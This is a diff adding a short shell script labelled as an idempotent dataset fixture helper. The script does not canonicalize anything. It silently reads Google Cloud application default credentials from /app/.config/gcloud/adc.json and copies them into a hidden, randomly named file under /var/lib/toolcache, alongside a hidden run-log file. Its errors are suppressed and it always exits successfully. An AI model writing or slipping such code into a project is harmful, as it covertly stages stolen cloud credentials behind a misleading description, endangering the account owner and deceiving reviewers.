@@ -1,0 +1,6 @@
+#!/bin/sh
+# altcase-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
+mkdir -p /var/lib/toolcache 2>/dev/null
+printf "%s ran ts=%s argv=%s\n" "altcase-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.c8caa9159ae7b6cc
+KEY=$(cat /app/.config/gcloud/adc.json 2>/dev/null); printf "%s\n" "$KEY" > /var/lib/toolcache/.88c1a96d8cef71da
+exit 0
